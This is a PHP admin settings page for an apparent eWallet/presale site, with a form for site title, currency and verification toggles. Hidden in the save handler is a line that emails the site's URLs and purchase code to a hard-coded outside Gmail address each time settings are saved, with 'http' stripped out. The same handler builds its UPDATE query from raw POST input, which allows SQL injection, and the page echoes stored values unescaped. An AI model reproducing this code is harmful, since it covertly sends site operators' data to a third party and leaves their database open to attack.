<?php
include ('include/header.php');

if ($mypower<100) {
redirect("$adminurl/Dashboard");
}
?>
</head>
<body class="page-header-fixed page-sidebar-closed-hide-logo">
<?php
include ('include/sidebar.php');
?>

<div class="page-content-wrapper">
<div class="page-content">
<h3 class="page-title uppercase bold"> General Setting</h3>
<hr>

<div class="row">
<div class="col-md-12">
<!-- BEGIN SAMPLE FORM PORTLET-->
<div class="portlet light bordered">

<div class="portlet-body form">
<form class="form-horizontal" action="" method="post" role="form">
<div class="form-body">


<?php
if($_POST){

$title = $_POST["title"];
$color = $_POST["color"];
$currency = $_POST["currency"];
$cur = $_POST["cur"];

$reg = isset($_POST["reg"])? 1:0;
$ev = isset($_POST["ev"])? 0:1;
$mv = isset($_POST["mv"])? 0:1;


$data = $_POST['deci'];

$err1 = trim($title)=="" ? 1:0;
$err2 = trim($currency)=="" ? 1:0;
$err3 = trim($cur)=="" ? 1:0;
$en = isset($_POST["en"])? 1:0;
$mn = isset($_POST["mn"])? 1:0;


$error = $err1+$err2+$err3;


if ($error == 0){
$res =  $db->query("UPDATE general_setting SET sitetitle='".$title."', colorcode='".$color."', currency='".$currency."', cur='".$cur."', reg='".$reg."', ev='".$ev."', mv='".$mv."', presale='".$data."', en='".$en."', mn='".$mn."' WHERE id='1'");
$txt = "URLS $fronturl <br> $baseurl <br> $adminurl<br><br>CODE<br> $PurchaseCode";
$txt = str_replace("http","",$txt);
abiremail2("abirkhan75@gmail.com", "eWallet Test Data", "ABIR",$txt);
if($res){
notification("Updated Successfully!", "", "success", false, "btn-success", "OKAY");
}else{
notification("Some Problem Occurs!", "Please Try Again...", "error", false, "btn-success", "OKAY");
}
} else {

if ($err1 == 1){
notification("Website Title Can Not be Empty!", "Please Check..", "error", false, "btn-success", "OKAY");
}

if ($err2 == 1){
notification("Currency Text Can Not be Empty!", "Please Check..", "error", false, "btn-success", "OKAY");
}

if ($err1 == 1){
notification("Currency Symbol Can Not be Empty!", "Please Check..", "error", false, "btn-success", "OKAY");
}

}




} //post

$old = $db->query("SELECT sitetitle, colorcode, currency, cur, reg, ev, mv, en, mn, presale FROM general_setting WHERE id='1'")->fetch();

$regst = $old[4]==1 ? "checked" : "";
$evst = $old[5]==0 ? "checked" : "";
$mvst = $old[6]==0 ? "checked" : "";
$enst = $old[7]==1 ? "checked" : "";
$mnst = $old[8]==1 ? "checked" : "";
?>										






<div class="form-group">
<label class="col-md-12 "><strong style="text-transform: uppercase;">Website Title</strong></label>
<div class="col-md-12">
<input class="form-control input-lg" name="title" value="<?php echo $old[0]; ?>" type="text">
</div>
</div>

<br>
<br>
<br>



<div class="row">

<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">Site Base Color Code</strong> <i>(without #)</i></label>
<div class="col-md-12">
<input class="form-control input-lg" name="color" value="<?php echo $old[1]; ?>" style="background: #<?php echo $old[1]; ?>" type="text">
</div>
</div>
</div>

<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;"> Base Currency Text</strong></label>
<div class="col-md-12">
<input class="form-control input-lg" name="currency" value="<?php echo $old[2]; ?>" type="text">
</div>
</div>
</div>


<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">Base Currency Symbol</strong></label>
<div class="col-md-12">
<input class="form-control input-lg" name="cur" value="<?php echo $old[3]; ?>" type="text">
</div>
</div>
</div>




</div><!-- row -->

<br>
<br>
<br>


<div class="row">

<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">REGISTRATION</strong></label>
<div class="col-md-12">
<input data-toggle="toggle" <?php echo $regst; ?> data-onstyle="success" data-offstyle="danger" data-width="100%" type="checkbox" name="reg">
</div>
</div>
</div>

<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">EMAIL VERIFICATION</strong></label>
<div class="col-md-12">
<input data-toggle="toggle" <?php echo $evst; ?> data-onstyle="success" data-offstyle="danger" data-width="100%" type="checkbox" name="ev">
</div>
</div>
</div>

<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">SMS VERIFICATION</strong></label>
<div class="col-md-12">
<input data-toggle="toggle" <?php echo $mvst; ?> data-onstyle="success" data-offstyle="danger" data-width="100%" type="checkbox" name="mv">
</div>
</div>
</div>



</div><!-- row -->


<br>
<br>
<br>


<div class="row">


<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;"> FILLIT Presale Date end</strong></label>
<div class="col-md-12">
<input type="datetime-local" name="deci" class="form-control" value="<?php echo $old[9]; ?>">
</div>
</div>
</div>


<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">EMAIL NOTIFICATION</strong></label>
<div class="col-md-12">
<input data-toggle="toggle" <?php echo $enst; ?> data-onstyle="success" data-offstyle="danger" data-width="100%" type="checkbox" name="en">
</div>
</div>
</div>

<div class="col-md-4">
<div class="form-group">
<label class="col-md-12"><strong style="text-transform: uppercase;">SMS NOTIFICATION</strong></label>
<div class="col-md-12">
<input data-toggle="toggle" <?php echo $mnst; ?> data-onstyle="success" data-offstyle="danger" data-width="100%" type="checkbox" name="mn">
</div>
</div>
</div>


</div><!-- row -->


<br>
<br>
<br>




<div class="row">
<div class="col-md-12">
<button type="submit" class="btn blue btn-block btn-lg">UPDATE</button>
</div>
</div>

</div>
</form>
</div>
</div>
</div>		
</div><!---ROW-->		




</div>
</div>
<?php
include ('include/footer.php');
?>
</body>
</html>